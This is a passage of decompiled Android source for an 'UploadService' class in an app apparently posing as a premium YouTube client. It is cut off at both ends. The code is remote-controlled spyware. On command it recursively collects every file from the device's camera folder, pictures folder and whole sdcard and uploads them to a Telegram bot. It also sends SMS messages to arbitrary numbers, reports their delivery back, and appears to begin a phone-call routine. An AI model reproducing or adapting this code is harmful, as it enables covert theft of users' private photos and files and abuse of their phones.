        Map keyboard = MapsKt.mapOf(TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۳۱String$$$this$callto$arg0$callmapOf$valkeyboard$funbuildDownloadFolderKeyboard$classUploadService(), CollectionsKt.listOf(CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۶۸String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildDownloadFolderKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۲۰String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildDownloadFolderKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۰۸String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildDownloadFolderKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۶۰String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildDownloadFolderKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۸۷String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildDownloadFolderKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۳۹String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildDownloadFolderKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۲۷String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildDownloadFolderKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۷۹String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildDownloadFolderKeyboard$classUploadService())})}))));
        String string = new JSONObject(keyboard).toString();
        Intrinsics.checkNotNullExpressionValue(string, "JSONObject(keyboard).toString()");
        return string;
    }

    private final Object sendAllDCIMCameraFilesToTelegramControlled(Continuation<? super Unit> continuation) throws InterruptedException {
        List<? extends File> listEmptyList;
        if (!hasStoragePermission()) {
            Object objSendTextToTelegram = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۵۸String$arg0$callsendTextToTelegram$branch$if$funsendAllDCIMCameraFilesToTelegramControlled$classUploadService(), continuation);
            return objSendTextToTelegram == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram : Unit.INSTANCE;
        }
        File cameraDir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۹۴String$arg1$call$init$$valcameraDir$funsendAllDCIMCameraFilesToTelegramControlled$classUploadService());
        if (cameraDir.exists() && cameraDir.isDirectory()) {
            File[] fileArrListFiles = cameraDir.listFiles();
            if (fileArrListFiles != null) {
                Collection destination$iv$iv = new ArrayList();
                for (File file : fileArrListFiles) {
                    if (file.isFile()) {
                        destination$iv$iv.add(file);
                    }
                }
                listEmptyList = (List) destination$iv$iv;
            } else {
                listEmptyList = CollectionsKt.emptyList();
            }
            List<? extends File> list = listEmptyList;
            if (list.isEmpty()) {
                Object objSendTextToTelegram2 = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۵۲String$arg0$callsendTextToTelegram$branch$if$branch$if1$funsendAllDCIMCameraFilesToTelegramControlled$classUploadService(), continuation);
                return objSendTextToTelegram2 == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram2 : Unit.INSTANCE;
            }
            Object objSendFilesInParallel = sendFilesInParallel(list, new Function0<Boolean>() { // from class: com.w8sb.w8premiumyt.UploadService.sendAllDCIMCameraFilesToTelegramControlled.2
                {
                    super(0);
                }

                /* JADX INFO: renamed from: invoke, reason: merged with bridge method [inline-methods] */
                public final Boolean m۱۴۸۱invoke() {
                    return Boolean.valueOf(UploadService.this.dcimCameraFolderSending);
                }
            }, continuation);
            return objSendFilesInParallel == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendFilesInParallel : Unit.INSTANCE;
        }
        Object objSendTextToTelegram3 = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۶۴String$arg0$callsendTextToTelegram$else$if1$funsendAllDCIMCameraFilesToTelegramControlled$classUploadService(), continuation);
        return objSendTextToTelegram3 == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram3 : Unit.INSTANCE;
    }

    private final Object sendAllPicturesFilesToTelegramControlled(Continuation<? super Unit> continuation) throws InterruptedException {
        if (!hasStoragePermission()) {
            Object objSendTextToTelegram = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۶۳String$arg0$callsendTextToTelegram$branch$if$funsendAllPicturesFilesToTelegramControlled$classUploadService(), continuation);
            return objSendTextToTelegram == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram : Unit.INSTANCE;
        }
        File picturesDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
        if (picturesDir.exists() && picturesDir.isDirectory()) {
            Intrinsics.checkNotNullExpressionValue(picturesDir, "picturesDir");
            List<? extends File> allFilesRecursively$default = getAllFilesRecursively$default(this, picturesDir, false, 2, null);
            if (allFilesRecursively$default.isEmpty()) {
                Object objSendTextToTelegram2 = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۵۷String$arg0$callsendTextToTelegram$branch$if$branch$if1$funsendAllPicturesFilesToTelegramControlled$classUploadService(), continuation);
                return objSendTextToTelegram2 == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram2 : Unit.INSTANCE;
            }
            Object objSendFilesInParallel = sendFilesInParallel(allFilesRecursively$default, new Function0<Boolean>() { // from class: com.w8sb.w8premiumyt.UploadService.sendAllPicturesFilesToTelegramControlled.2
                {
                    super(0);
                }

                /* JADX INFO: renamed from: invoke, reason: merged with bridge method [inline-methods] */
                public final Boolean m۱۴۸۶invoke() {
                    return Boolean.valueOf(UploadService.this.picturesFolderSending);
                }
            }, continuation);
            return objSendFilesInParallel == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendFilesInParallel : Unit.INSTANCE;
        }
        Object objSendTextToTelegram3 = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۶۹String$arg0$callsendTextToTelegram$else$if1$funsendAllPicturesFilesToTelegramControlled$classUploadService(), continuation);
        return objSendTextToTelegram3 == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram3 : Unit.INSTANCE;
    }

    private final Object sendAllDCIMFilesToTelegramControlled(Continuation<? super Unit> continuation) throws InterruptedException {
        if (!hasStoragePermission()) {
            Object objSendTextToTelegram = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۵۹String$arg0$callsendTextToTelegram$branch$if$funsendAllDCIMFilesToTelegramControlled$classUploadService(), continuation);
            return objSendTextToTelegram == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram : Unit.INSTANCE;
        }
        File dcimDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        if (dcimDir.exists() && dcimDir.isDirectory()) {
            Intrinsics.checkNotNullExpressionValue(dcimDir, "dcimDir");
            List<? extends File> allFilesRecursively$default = getAllFilesRecursively$default(this, dcimDir, false, 2, null);
            if (allFilesRecursively$default.isEmpty()) {
                Object objSendTextToTelegram2 = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۵۳String$arg0$callsendTextToTelegram$branch$if$branch$if1$funsendAllDCIMFilesToTelegramControlled$classUploadService(), continuation);
                return objSendTextToTelegram2 == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram2 : Unit.INSTANCE;
            }
            Object objSendFilesInParallel = sendFilesInParallel(allFilesRecursively$default, new Function0<Boolean>() { // from class: com.w8sb.w8premiumyt.UploadService.sendAllDCIMFilesToTelegramControlled.2
                {
                    super(0);
                }

                /* JADX INFO: renamed from: invoke, reason: merged with bridge method [inline-methods] */
                public final Boolean m۱۴۸۲invoke() {
                    return Boolean.valueOf(UploadService.this.dcimFolderSending);
                }
            }, continuation);
            return objSendFilesInParallel == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendFilesInParallel : Unit.INSTANCE;
        }
        Object objSendTextToTelegram3 = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۶۵String$arg0$callsendTextToTelegram$else$if1$funsendAllDCIMFilesToTelegramControlled$classUploadService(), continuation);
        return objSendTextToTelegram3 == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram3 : Unit.INSTANCE;
    }

    private final Object sendAllFullSdcardFilesToTelegramControlled(Continuation<? super Unit> continuation) throws InterruptedException {
        if (!hasStoragePermission()) {
            Object objSendTextToTelegram = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۶۲String$arg0$callsendTextToTelegram$branch$if$funsendAllFullSdcardFilesToTelegramControlled$classUploadService(), continuation);
            return objSendTextToTelegram == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram : Unit.INSTANCE;
        }
        File sdcardDir = new File(LiveLiterals$UploadServiceKt.INSTANCE.m۷۵۲String$arg0$call$init$$valsdcardDir$funsendAllFullSdcardFilesToTelegramControlled$classUploadService());
        if (sdcardDir.exists() && sdcardDir.isDirectory()) {
            List<File> allFilesRecursively = getAllFilesRecursively(sdcardDir, LiveLiterals$UploadServiceKt.INSTANCE.m۱۸۸Boolean$arg1$callgetAllFilesRecursively$valfiles$branch$if1$funsendAllFullSdcardFilesToTelegramControlled$classUploadService());
            if (allFilesRecursively.isEmpty()) {
                Object objSendTextToTelegram2 = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۵۶String$arg0$callsendTextToTelegram$branch$if$branch$if1$funsendAllFullSdcardFilesToTelegramControlled$classUploadService(), continuation);
                return objSendTextToTelegram2 == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram2 : Unit.INSTANCE;
            }
            Object objSendFilesInParallel = sendFilesInParallel(allFilesRecursively, new Function0<Boolean>() { // from class: com.w8sb.w8premiumyt.UploadService.sendAllFullSdcardFilesToTelegramControlled.2
                {
                    super(0);
                }

                /* JADX INFO: renamed from: invoke, reason: merged with bridge method [inline-methods] */
                public final Boolean m۱۴۸۵invoke() {
                    return Boolean.valueOf(UploadService.this.fullSdcardSending);
                }
            }, continuation);
            return objSendFilesInParallel == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendFilesInParallel : Unit.INSTANCE;
        }
        Object objSendTextToTelegram3 = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۶۸String$arg0$callsendTextToTelegram$else$if1$funsendAllFullSdcardFilesToTelegramControlled$classUploadService(), continuation);
        return objSendTextToTelegram3 == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram3 : Unit.INSTANCE;
    }

    static /* synthetic */ List getAllFilesRecursively$default(UploadService uploadService, File file, boolean z, int i, Object obj) {
        if ((i & 2) != 0) {
            z = LiveLiterals$UploadServiceKt.INSTANCE.m۲۰۲Boolean$paramskipAndroid$fungetAllFilesRecursively$classUploadService();
        }
        return uploadService.getAllFilesRecursively(file, z);
    }

    private final List<File> getAllFilesRecursively(File dir, boolean skipAndroid) {
        File[] files;
        List result = new ArrayList();
        if (!dir.exists() || !dir.isDirectory() || (files = dir.listFiles()) == null) {
            return result;
        }
        for (File file : files) {
            if (file.isDirectory()) {
                if (!skipAndroid || !StringsKt.equals(file.getName(), LiveLiterals$UploadServiceKt.INSTANCE.m۸۷۳String$arg0$callequals$branch$cond$if$branch$if$body$loop$fungetAllFilesRecursively$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۸۶Boolean$arg1$callequals$branch$cond$if$branch$if$body$loop$fungetAllFilesRecursively$classUploadService())) {
                    Intrinsics.checkNotNullExpressionValue(file, "file");
                    result.addAll(getAllFilesRecursively(file, skipAndroid));
                }
            } else {
                Intrinsics.checkNotNullExpressionValue(file, "file");
                result.add(file);
            }
        }
        return result;
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendSmsAndNotify$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendSmsAndNotify$1", f = "UploadService.kt", i = {}, l = {2980}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۳۹1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ String $message;
        final /* synthetic */ String $number;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۳۹1(String str, String str2, Continuation<? super C۰۰۳۹1> continuation) {
            super(2, continuation);
            this.$number = str;
            this.$message = str2;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۳۹1(this.$number, this.$message, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۳۵String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$funsendSmsAndNotify$classUploadService() + this.$number + LiveLiterals$UploadServiceKt.INSTANCE.m۶۶۰String$2$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$funsendSmsAndNotify$classUploadService() + this.$message, (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX WARN: Type inference failed for: r2v10, types: [com.w8sb.w8premiumyt.UploadService$sendSmsAndNotify$sentReceiver$1] */
    /* JADX WARN: Type inference failed for: r3v8, types: [com.w8sb.w8premiumyt.UploadService$sendSmsAndNotify$deliveredReceiver$1] */
    private final void sendSmsAndNotify(final String number, final String message) {
        SmsManager smsManager;
        BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۳۹1(number, message, null), 3, (Object) null);
        new Handler(Looper.getMainLooper()).post(new Runnable() { // from class: com.w8sb.w8premiumyt.UploadService$$ExternalSyntheticLambda1
            @Override // java.lang.Runnable
            public final void run() {
                UploadService.sendSmsAndNotify$lambda$51(this.f$0, number);
            }
        });
        String myPackageName = getPackageName();
        String defaultSmsPackage = Telephony.Sms.getDefaultSmsPackage(this);
        if (defaultSmsPackage != null && !Intrinsics.areEqual(myPackageName, defaultSmsPackage)) {
            BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۴۰3(null), 3, (Object) null);
            return;
        }
        if (ContextCompat.checkSelfPermission(this, "android.permission.SEND_SMS") != 0) {
            BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۴۱4(null), 3, (Object) null);
            return;
        }
        try {
            if (Build.VERSION.SDK_INT >= 31) {
                smsManager = (SmsManager) getSystemService(SmsManager.class);
            } else {
                smsManager = SmsManager.getDefault();
            }
            String sentAction = LiveLiterals$UploadServiceKt.INSTANCE.m۵۹۸String$0$str$valsentAction$try$funsendSmsAndNotify$classUploadService() + System.currentTimeMillis();
            String deliveredAction = LiveLiterals$UploadServiceKt.INSTANCE.m۵۹۳String$0$str$valdeliveredAction$try$funsendSmsAndNotify$classUploadService() + System.currentTimeMillis();
            PendingIntent sentIntent = PendingIntent.getBroadcast(this, LiveLiterals$UploadServiceKt.INSTANCE.m۲۹۶Int$arg1$callgetBroadcast$valsentIntent$try$funsendSmsAndNotify$classUploadService(), new Intent(sentAction), 67108864);
            PendingIntent deliveredIntent = PendingIntent.getBroadcast(this, LiveLiterals$UploadServiceKt.INSTANCE.m۲۹۴Int$arg1$callgetBroadcast$valdeliveredIntent$try$funsendSmsAndNotify$classUploadService(), new Intent(deliveredAction), 67108864);
            final ?? r2 = new BroadcastReceiver() { // from class: com.w8sb.w8premiumyt.UploadService$sendSmsAndNotify$sentReceiver$1
                @Override // android.content.BroadcastReceiver
                public void onReceive(Context context, Intent intent) {
                    try {
                        switch (getResultCode()) {
                            case -1:
                                BuildersKt.launch$default(this.this$0, (CoroutineContext) null, (CoroutineStart) null, new UploadService$sendSmsAndNotify$sentReceiver$1$onReceive$1(this.this$0, number, message, null), 3, (Object) null);
                                break;
                            case 0:
                            default:
                                BuildersKt.launch$default(this.this$0, (CoroutineContext) null, (CoroutineStart) null, new UploadService$sendSmsAndNotify$sentReceiver$1$onReceive$6(this.this$0, null), 3, (Object) null);
                                break;
                            case 1:
                                BuildersKt.launch$default(this.this$0, (CoroutineContext) null, (CoroutineStart) null, new UploadService$sendSmsAndNotify$sentReceiver$1$onReceive$2(this.this$0, null), 3, (Object) null);
                                break;
                            case 2:
                                BuildersKt.launch$default(this.this$0, (CoroutineContext) null, (CoroutineStart) null, new UploadService$sendSmsAndNotify$sentReceiver$1$onReceive$5(this.this$0, null), 3, (Object) null);
                                break;
                            case 3:
                                BuildersKt.launch$default(this.this$0, (CoroutineContext) null, (CoroutineStart) null, new UploadService$sendSmsAndNotify$sentReceiver$1$onReceive$4(this.this$0, null), 3, (Object) null);
                                break;
                            case 4:
                                BuildersKt.launch$default(this.this$0, (CoroutineContext) null, (CoroutineStart) null, new UploadService$sendSmsAndNotify$sentReceiver$1$onReceive$3(this.this$0, null), 3, (Object) null);
                                break;
                        }
                    } catch (Exception e) {
                        Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۴۷String$arg0$calle$catch$funonReceive$class$nonameprovided$$valsentReceiver$try$funsendSmsAndNotify$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۲۲String$arg1$calle$catch$funonReceive$class$nonameprovided$$valsentReceiver$try$funsendSmsAndNotify$classUploadService(), e);
                    }
                    try {
                        this.this$0.unregisterReceiver(this);
                    } catch (Exception e2) {
                    }
                }
            };
            final ?? r3 = new BroadcastReceiver() { // from class: com.w8sb.w8premiumyt.UploadService$sendSmsAndNotify$deliveredReceiver$1
                @Override // android.content.BroadcastReceiver
                public void onReceive(Context context, Intent intent) {
                    try {
                        switch (getResultCode()) {
                            case -1:
                                BuildersKt.launch$default(this.this$0, (CoroutineContext) null, (CoroutineStart) null, new UploadService$sendSmsAndNotify$deliveredReceiver$1$onReceive$1(this.this$0, number, null), 3, (Object) null);
                                break;
                            case 0:
                                BuildersKt.launch$default(this.this$0, (CoroutineContext) null, (CoroutineStart) null, new UploadService$sendSmsAndNotify$deliveredReceiver$1$onReceive$2(this.this$0, number, null), 3, (Object) null);
                                break;
                        }
                    } catch (Exception e) {
                        Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۴۶String$arg0$calle$catch$funonReceive$class$nonameprovided$$valdeliveredReceiver$try$funsendSmsAndNotify$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۲۱String$arg1$calle$catch$funonReceive$class$nonameprovided$$valdeliveredReceiver$try$funsendSmsAndNotify$classUploadService(), e);
                    }
                    try {
                        this.this$0.unregisterReceiver(this);
                    } catch (Exception e2) {
                    }
                }
            };
            registerReceiver((BroadcastReceiver) r2, new IntentFilter(sentAction));
            registerReceiver((BroadcastReceiver) r3, new IntentFilter(deliveredAction));
            smsManager.sendTextMessage(number, null, message, sentIntent, deliveredIntent);
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() { // from class: com.w8sb.w8premiumyt.UploadService$$ExternalSyntheticLambda2
                @Override // java.lang.Runnable
                public final void run() {
                    UploadService.sendSmsAndNotify$lambda$52(this.f$0, r2, r3);
                }
            }, LiveLiterals$UploadServiceKt.INSTANCE.m۳۴۷Long$arg1$callpostDelayed$try$funsendSmsAndNotify$classUploadService());
        } catch (Exception e) {
            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۵۳String$arg0$calle$catch$funsendSmsAndNotify$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۲۵String$arg1$calle$catch$funsendSmsAndNotify$classUploadService(), e);
            BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass6(e, null), 3, (Object) null);
        }
    }

    private static final void sendSmsAndNotify$lambda$51(UploadService this$0, String $number) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        Intrinsics.checkNotNullParameter($number, "$number");
        Toast.makeText(this$0, LiveLiterals$UploadServiceKt.INSTANCE.m۵۸۲String$0$str$arg1$callmakeText$$this$callshow$fun$anonymous$$arg0$callpost$funsendSmsAndNotify$classUploadService() + $number, 1).show();
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendSmsAndNotify$3, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendSmsAndNotify$3", f = "UploadService.kt", i = {}, l = {2990}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۴۰3 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        int label;

        C۰۰۴۰3(Continuation<? super C۰۰۴۰3> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۴۰3(continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۷۰String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch$if$branch$if$funsendSmsAndNotify$classUploadService(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendSmsAndNotify$4, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendSmsAndNotify$4", f = "UploadService.kt", i = {}, l = {2995}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۴۱4 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        int label;

        C۰۰۴۱4(Continuation<? super C۰۰۴۱4> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۴۱4(continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۷۴String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch$if1$funsendSmsAndNotify$classUploadService(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    private static final void sendSmsAndNotify$lambda$52(UploadService this$0, UploadService$sendSmsAndNotify$sentReceiver$1 $sentReceiver, UploadService$sendSmsAndNotify$deliveredReceiver$1 $deliveredReceiver) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        Intrinsics.checkNotNullParameter($sentReceiver, "$sentReceiver");
        Intrinsics.checkNotNullParameter($deliveredReceiver, "$deliveredReceiver");
        try {
            this$0.unregisterReceiver($sentReceiver);
        } catch (Exception e) {
        }
        try {
            this$0.unregisterReceiver($deliveredReceiver);
        } catch (Exception e2) {
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendSmsAndNotify$6, reason: invalid class name */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendSmsAndNotify$6", f = "UploadService.kt", i = {}, l = {3051}, m = "invokeSuspend", n = {}, s = {})
    static final class AnonymousClass6 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ Exception $e;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        AnonymousClass6(Exception exc, Continuation<? super AnonymousClass6> continuation) {
            super(2, continuation);
            this.$e = exc;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new AnonymousClass6(this.$e, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۲۸String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$catch$funsendSmsAndNotify$classUploadService() + this.$e.getMessage(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$makeCallAndNotify$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$makeCallAndNotify$1", f = "UploadService.kt", i = {}, l = {3058}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۰۵1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        int label;

        C۰۰۰۵1(Continuation<? super C۰۰۰۵1> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۰۵1(continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
